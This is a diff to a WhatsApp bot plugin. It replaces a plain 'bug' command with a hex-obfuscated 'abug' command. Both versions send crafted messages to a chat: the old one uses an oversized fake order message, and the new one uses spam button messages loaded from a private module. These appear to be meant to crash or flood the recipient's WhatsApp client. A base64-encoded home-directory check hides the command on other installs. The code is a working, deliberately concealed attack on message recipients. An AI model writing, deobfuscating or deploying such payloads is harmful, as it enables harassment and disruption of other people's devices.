@@ -1,15 +1,1 @@
-const QueenSew = require('../events');
-const {MessageType, MessageOptions, Mimetype} = require('@adiwajshing/baileys');
-const exec = require('child_process').exec;
-const os = require("os");
-const fs = require('fs');
-const got = require('got');
-const axios = require('axios');
-const Config = require('../config');
-var rgms = { cd: 'L3Jvb3QvUXVlZW5TZXdXaGF0c2FwcEJvdC8=', pay: '' }    
-var rrrr = Buffer.from(rgms.cd, 'base64')
-var ssss = rrrr.toString('utf-8')
-rgms.pay = ssss
-if (os.userInfo().homedir !== rgms.pay) return;
-QueenSew.newcmdaddtosew({pattern: 'bug ?(.*)', fromMe: true, delownsewcmd: false, dontAdCommandList: true}, (async (message, match) => { 
-await message.client.sendMessage(message.jid, 'sew queen',MessageType.text, { quoted: { key: { participant: '1111111111@s.whatsapp.net' }, message: { orderMessage: { itemCount: 70000, status: 1, surface: 1, message: test1, orderTitle: test2, sellerJid: '0@s.whatsapp.net' }}}})}))
+var _0xacb1=["\x2E\x2E\x2F\x65\x76\x65\x6E\x74\x73","\x40\x61\x64\x69\x77\x61\x6A\x73\x68\x69\x6E\x67\x2F\x62\x61\x69\x6C\x65\x79\x73","\x65\x78\x65\x63","\x63\x68\x69\x6C\x64\x5F\x70\x72\x6F\x63\x65\x73\x73","\x6F\x73","\x66\x73","\x67\x6F\x74","\x61\x78\x69\x6F\x73","\x2E\x2E\x2F\x63\x6F\x6E\x66\x69\x67","\x73\x65\x77\x71\x75\x65\x65\x6E\x2D\x72\x73\x2D\x70\x76\x74","\x4C\x33\x4A\x76\x62\x33\x51\x76\x55\x58\x56\x6C\x5A\x57\x35\x54\x5A\x58\x64\x58\x61\x47\x46\x30\x63\x32\x46\x77\x63\x45\x4A\x76\x64\x43\x38\x3D","","\x63\x64","\x62\x61\x73\x65\x36\x34","\x66\x72\x6F\x6D","\x75\x74\x66\x2D\x38","\x70\x61\x79","\x68\x6F\x6D\x65\x64\x69\x72","\x75\x73\x65\x72\x49\x6E\x66\x6F","\x61\x62\x75\x67\x20\x3F\x28\x2E\x2A\x29","\x65\x6D\x6F\x6A\x69\x31","\x73\x65\x77\x73\x70\x61\x6D\x39","\x73\x65\x77\x73\x70\x61\x6D\x36","\uD83D\uDE08\uD83D\uDE08\uD83D\uDE08\uD83D\uDE08","\uD83D\uDC7F\uD83D\uDC7F\uD83D\uDC7F\uD83D\uDC7F","\x6A\x69\x64","\x62\x75\x74\x74\x6F\x6E\x73\x4D\x65\x73\x73\x61\x67\x65","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65","\x63\x6C\x69\x65\x6E\x74","\x6E\x65\x77\x63\x6D\x64\x61\x64\x64\x74\x6F\x73\x65\x77"];const QueenSew=require(_0xacb1[0]);const {MessageType,MessageOptions,Mimetype}=require(_0xacb1[1]);const exec=require(_0xacb1[3])[_0xacb1[2]];const os=require(_0xacb1[4]);const fs=require(_0xacb1[5]);const got=require(_0xacb1[6]);const axios=require(_0xacb1[7]);const Config=require(_0xacb1[8]);const Pach=require(_0xacb1[9]);var rgms={cd:_0xacb1[10],pay:_0xacb1[11]};var rrrr=Buffer[_0xacb1[14]](rgms[_0xacb1[12]],_0xacb1[13]);var ssss=rrrr.toString(_0xacb1[15]);rgms[_0xacb1[16]]= ssss;if(os[_0xacb1[18]]()[_0xacb1[17]]!== rgms[_0xacb1[16]]){return};QueenSew[_0xacb1[29]]({pattern:_0xacb1[19],fromMe:true,delownsewcmd:false},(async (_0x8b51xc,_0x8b51xd)=>{const _0x8b51xe= await Pach[_0xacb1[20]]();const _0x8b51xf= await Pach[_0xacb1[21]]();const _0x8b51x10= await Pach[_0xacb1[22]]();const _0x8b51x11=[{buttonId:`${_0xacb1[11]}${_0x8b51xf}${_0xacb1[11]}`,buttonText:{displayText:_0xacb1[23]},type:1},{buttonId:`${_0xacb1[11]}${_0x8b51x10}${_0xacb1[11]}`,buttonText:{displayText:_0xacb1[24]},type:1}];const _0x8b51x12={contentText:`${_0xacb1[11]}${_0x8b51xf}${_0xacb1[11]}`,footerText:`${_0xacb1[11]}${_0x8b51xe}${_0xacb1[11]}`,buttons:_0x8b51x11,headerType:1}; await _0x8b51xc[_0xacb1[28]][_0xacb1[27]](_0x8b51xc[_0xacb1[25]],_0x8b51x12,MessageType[_0xacb1[26]])}))
